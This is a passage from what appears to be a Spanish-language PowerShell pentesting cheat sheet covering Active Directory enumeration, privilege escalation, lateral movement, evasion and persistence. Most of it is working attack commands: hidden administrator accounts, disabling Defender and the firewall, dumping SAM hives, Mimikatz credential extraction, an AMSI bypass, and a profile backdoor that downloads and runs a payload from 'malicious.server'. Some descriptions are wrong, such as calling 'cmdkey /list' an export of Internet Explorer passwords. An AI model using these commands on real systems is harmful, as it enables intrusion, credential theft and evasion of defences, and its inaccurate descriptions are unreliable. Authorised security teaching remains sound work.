* **Active Directory**: Manipulación y auditoría de entornos AD.
* **PowerView**: Enumeración y explotación de Active Directory.
* **PowerUp**: Escalación de privilegios en sistemas Windows.
* **Mimikatz**: Extracción de credenciales y hashes.
* **Kekeo**: Manipulación de tickets Kerberos.

## BONUS (Active Directory)

Esta sección cubre técnicas esenciales para reconocimiento del entorno, post-explotación y recolección de información usando PowerShell.\
⚠️ Úsalo únicamente en contextos legales y autorizados (como auditorías o entornos de laboratorio).

***

### 📄 Volcado de salida a archivos o HTML

| **Comando**      | **Descripción**                                   |
| ---------------- | ------------------------------------------------- |
| `Out-File`       | Redirige la salida de un comando a un archivo.    |
| `ConvertTo-Html` | Convierte la salida a formato HTML para informes. |

***

### 📜 Historial de comandos

| **Comando**              | **Descripción**                            |
| ------------------------ | ------------------------------------------ |
| `Get-History`            | Muestra el historial completo de comandos. |
| `Get-History -Count <n>` | Muestra los últimos `n` comandos usados.   |

***

### 🌐 Reconocimiento del entorno

### 🔧 Unidades y variables del entorno

| **Comando**     | **Descripción**                                               |
| --------------- | ------------------------------------------------------------- |
| `Get-PSDrive`   | Lista todos los proveedores y unidades (ej. `Env:`, `HKLM:`). |
| `Get-Item Env:` | Muestra todas las variables de entorno del sistema.           |

### 🖥️ Ejecución remota

| **Comando**                                                | **Descripción**                                                                             |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `Invoke-Command -ComputerName <host> -ScriptBlock { ... }` | Ejecuta comandos en sistemas remotos. Fundamental para pivoting y control post-explotación. |

***

### 🕵️ Post-Explotación y Recolección de Información

### 👥 Enumeración de usuarios

| **Comando**                                    | **Descripción**                                    |
| ---------------------------------------------- | -------------------------------------------------- |
| `Get-LocalUser`                                | Lista todos los usuarios locales del sistema.      |
| `Get-LocalGroupMember -Group "Administrators"` | Muestra los miembros del grupo de administradores. |

### 💻 Sesiones activas y conexiones

| **Comando**            | **Descripción**                                  |
| ---------------------- | ------------------------------------------------ |
| `qwinsta`              | Lista las sesiones activas en el sistema actual. |
| `Get-NetTCPConnection` | Muestra conexiones de red activas y sus puertos. |

### 🔍 Búsqueda de archivos interesantes

| **Comando**                                                         | **Descripción**                                                    |
| ------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `Get-ChildItem -Recurse -Include *.kdbx,*.txt,*.xml -Path C:\Users` | Busca archivos como contraseñas, config. o bases de datos KeePass. |

### 🧗‍♂️ PowerShell para Pentesters: Escalada, Persistencia y Movimiento Lateral

Este módulo reúne comandos clave de PowerShell para escenarios de post-explotación avanzada, escalada de privilegios, evasión, persistencia y movimiento lateral en entornos de red.

***

### 🔐 Escalada de Privilegios

| **Comando**                                                           | **Descripción**                                       |
| --------------------------------------------------------------------- | ----------------------------------------------------- |
| `Invoke-TokenManipulation -ImpersonateUser -Username "Administrador"` | Impersonar el token de un usuario como Administrador. |

***

### 🔄 Movimiento Lateral

| **Comando**                                                            | **Descripción**                             |
| ---------------------------------------------------------------------- | ------------------------------------------- |
| `Invoke-Command -ComputerName SERVIDOR1 -ScriptBlock { Get-Service }`  | Ejecuta comandos en otro sistema remoto.    |
| `Enter-PSSession -ComputerName SERVIDOR1 -Credential (Get-Credential)` | Sesión interactiva remota con credenciales. |

***

### 🛡️ Evasión y Persistencia

#### 🔍 Ofuscación

| **Comando**                                       | **Descripción**                         |
| ------------------------------------------------- | --------------------------------------- |
| `powershell.exe -EncodedCommand <payload_base64>` | Ejecutar comandos ofuscados con Base64. |
| `powershell -e <payload_base64>`                  | Variante corta de ejecución codificada. |

#### 👤 Crear usuario oculto

```powershell
net user backdoor Passw0rd! /add
net localgroup Administrators backdoor /add
```

Crea un usuario con privilegios elevados.

#### ❌ Deshabilitar antivirus temporalmente

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Desactiva Windows Defender de forma temporal.

#### 💾 Extraer hashes del sistema

```powershell
reg save HKLM\SAM sam.save reg save HKLM\SYSTEM system.save
```

Guarda claves del registro para dump posterior de hashes.

#### 🔑 Buscar credenciales en memoria

```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

Usa Mimikatz para extraer contraseñas desde la RAM.

***

### 🌐 Enumeración y Pivoting en la Red

| **Comando**                                                                            | **Descripción**                            |
| -------------------------------------------------------------------------------------- | ------------------------------------------ |
| `Invoke-Command -ComputerName TARGET -ScriptBlock { net view \\TARGET }`               | Lista recursos compartidos de una máquina. |
| `Test-NetConnection -ComputerName 192.168.1.10 -Port 3389`                             | Verifica puertos abiertos (ej. RDP).       |
| `Get-NetTCPConnection \| Select-Object LocalAddress,RemoteAddress,State,OwningProcess` | Enumera conexiones y procesos asociados.   |

***

### 🧬 Persistencia

| **Comando**                                                                                                      | **Descripción**                                                         |
| ---------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| `schtasks /create /sc minute /mo 5 /tn "Updater" /tr "powershell.exe -WindowStyle Hidden -File C:\backdoor.ps1"` | Crea una tarea programada persistente cada 5 min (oculta).              |
| `Add-Content $PROFILE 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.server/payload.ps1")'`    | Agrega backdoor persistente al perfil de PowerShell del usuario actual. |

***

### 🧱 Técnicas de Evasión (Bypass AMSI)

#### 🛡️ Bypass AMSI en tiempo de ejecución

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'). GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Evita que AMSI intercepte scripts sospechosos.

### 🛠️ Comandos Prácticos para Dominar PowerShell

Una recopilación de comandos avanzados y prácticos para recolección de información, post-explotación, evasión, persistencia y automatización con PowerShell.

***

### 📡 Recolección de Información Avanzada

| **Comando**                                                                        | **Descripción**                               |
| ---------------------------------------------------------------------------------- | --------------------------------------------- |
| `Get-NetIPConfiguration`                                                           | Muestra la configuración de red actual.       |
| `Get-ADUser -Filter * \| Select-Object Name, SamAccountName`                       | Lista todos los usuarios del dominio.         |
| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 10`            | Muestra los 10 procesos que más consumen CPU. |
| `Select-String -Path "C:\Users\*\Documents\*.txt" -Pattern "password\|login\|key"` | Busca palabras clave en archivos de texto.    |

***

### 🛡️ Post-Explotación y Escalada

| **Comando**                                                                                                                       | **Descripción**                                               |
| --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| `Get-WmiObject win32_service \| Where-Object { $_.StartName -notlike "NT AUTHORITY\*" -and $_.StartName -notlike "LocalSystem" }` | Lista servicios potencialmente vulnerables a escalada.        |
| `Get-NetTCPConnection \| Select-Object LocalAddress,RemoteAddress,RemotePort,State`                                               | Enumera todas las conexiones de red activas.                  |
| `cmdkey /list`                                                                                                                    | Exporta todas las contraseñas guardadas en Internet Explorer. |

***

### 🕵️‍♂️ Evasión y Persistencia

#### 🔄 Bypass de AMSI

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### 🧬 Ofuscar un payload en Base64

```powershell
$command = 'Get-Process'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

***

### 🤖 Automatización Útil

| **Comando**                                                                   | **Descripción**                            |
| ----------------------------------------------------------------------------- | ------------------------------------------ |
| `Get-LocalUser \| Export-Csv -Path C:\Temp\users.csv`                         | Exporta usuarios locales a un archivo CSV. |
| `Get-LocalGroup \| Export-Csv -Path C:\Temp\groups.csv`                       | Exporta grupos locales a un archivo CSV.   |
| `Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct` | Detecta antivirus instalado en el sistema. |
| `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`        | Desactiva el Firewall de Windows.          |

***

### 💻 Información del Sistema y Gestión de Usuarios

| **Comando**                                            | **Descripción**                                   |
| ------------------------------------------------------ | ------------------------------------------------- |
| `Get-ComputerInfo`                                     | Muestra información detallada del sistema.        |
| `Get-LocalUser`                                        | Lista usuarios locales.                           |
| `Get-LocalUser -Name "NombreUsuario" \| Format-List *` | Muestra información completa de un usuario local. |
| `Get-LocalGroup`                                       | Lista los grupos locales.                         |
| `Get-LocalGroupMember -Group "Administradores"`        | Lista miembros del grupo "Administradores".       |

***

### 🖥️ Programas y Servicios

| **Comando**                                                                        | **Descripción**                                      |
| ---------------------------------------------------------------------------------- | ---------------------------------------------------- |
| `Get-WmiObject -Class Win32_Product \| Select-Object Name, Version`                | Lista programas instalados.                          |
| `Get-Service \| Where-Object {$_.Status -eq "Running"} \| Sort-Object DisplayName` | Servicios activos ordenados por nombre.              |
| `Get-Service \| Where-Object {$_.StartType -eq "Automatic"}`                       | Lista servicios configurados para inicio automático. |

***

### 🔌 Red y Comunicaciones

| **Comando**                                             | **Descripción**                                  |
| ------------------------------------------------------- | ------------------------------------------------ |
| `Get-NetIPAddress`                                      | Muestra configuración de IPs en la máquina.      |
| `Get-NetRoute`                                          | Lista las rutas de red configuradas.             |
| `Get-NetTCPConnection \| Sort-Object LocalPort`         | Enumera conexiones y puertos abiertos ordenados. |
| `Test-Connection google.com -Count 4`                   | Realiza ping a un dominio.                       |
| `Test-NetConnection -ComputerName google.com -Port 443` | Prueba la conectividad a un puerto específico.   |
| `netsh wlan show profiles`                              | Lista las redes WiFi guardadas.                  |
| `netsh wlan show profile name="MiWiFi" key=clear`       | Muestra la contraseña de una red WiFi guardada.  |

***

### 📂 Post-explotación en Equipos Standalone

| **Comando**                                                                                                                                            | **Descripción**                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------- |
| `Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue \| Select-String -Pattern "password\|clave\|secret\|login"` | Busca archivos con posibles credenciales o datos sensibles. |
| `cmdkey /list`                                                                                                                                         | Exporta contraseñas guardadas (solo IE/Edge clásico).       |
| `Get-Process \| Where-Object {$_.Path -like "*System32*"} \| Select-Object Name,Id,Path`                                                               | Lista procesos ejecutándose con privilegios elevados.       |
| `net user hacker Password123! /add`                                                                                                                    | Crea un usuario local llamado `hacker`.                     |
| `net localgroup Administradores hacker /add`                                                                                                           | Añade el usuario `hacker` al grupo de administradores.      |

***

### 🔒 Hardening y Defensa (Blue Team)

| **Comando**                                                           | **Descripción**                                                |
| --------------------------------------------------------------------- | -------------------------------------------------------------- |
| `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True` | Activa el Firewall de Windows.                                 |
| `Install-WindowsUpdate -AcceptAll -AutoReboot`                        | Instala actualizaciones pendientes y reinicia si es necesario. |
| `Get-HotFix \| Sort-Object InstalledOn -Descending`                   | Lista actualizaciones instaladas ordenadas por fecha.          |
| `Get-LocalUser \| Where-Object {$_.PasswordExpires -eq $false}`       | Muestra usuarios con contraseñas que nunca expiran.            |
